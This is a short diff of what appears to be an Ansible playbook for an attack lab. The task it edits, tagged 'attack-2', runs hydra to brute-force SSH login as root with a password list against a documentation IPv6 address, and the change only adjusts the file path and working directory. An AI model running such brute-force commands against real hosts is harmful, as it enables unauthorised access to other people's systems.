@@ -126,6 +126,6 @@
 
    - name: brut force the target with list of passwords.
      tags: attack-2
-     shell: |
-       hydra -s 22 -V -l root -P /files/pw-list.txt -t 10 -f 2001:db8:0:1::1 ssh
-    
+     shell: hydra -s 22 -V -l root -P pw-list.txt -t 10 -f 2001:db8:0:1::1 ssh
+     args:
+       chdir: /root/hydra
